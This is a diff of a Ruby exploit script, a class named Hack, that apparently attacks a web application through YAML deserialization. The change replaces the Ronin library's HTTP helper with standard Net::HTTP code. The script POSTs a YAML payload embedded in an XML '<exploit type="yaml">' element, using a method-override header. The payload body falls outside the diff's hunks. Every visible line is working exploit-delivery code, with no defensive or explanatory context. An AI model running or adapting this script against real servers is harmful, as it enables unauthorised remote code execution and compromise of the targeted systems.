@@ -1,10 +1,7 @@
-require 'ronin/formatting/html'
 require 'net/http'
 require 'uri'
 class Hack
 
-  include Ronin::UI::Output::Helpers
-  include Ronin::Network::HTTP
   attr_accessor :url, :payload
 
   def initialize(url)
@@ -54,18 +51,19 @@ yaml = %{
 
 xml = %{
 <?xml version="1.0" encoding="UTF-8"?>
-<exploit type="yaml">#{yaml.html_escape}</exploit>
+<exploit type="yaml">#{CGI.escape_html yaml}</exploit>
 }.strip
 
-    return http_post(
-      url: url,
-      headers: {
-        content_type: 'text/xml',
-        x_http_method_override: 'get'
-      },
-      body: xml
-    )
 
+    uri = URI.parse(url)
+    http = Net::HTTP.new(uri.host, uri.port)
+
+    request = Net::HTTP::Post.new(uri.request_uri)
+    request.body = xml
+    request["X-HTTP-METHOD-OVERRIDE"] = 'get'
+    request["Content-Type"] = "text/xml"
+
+    response = http.request(request)
   end
 
 end
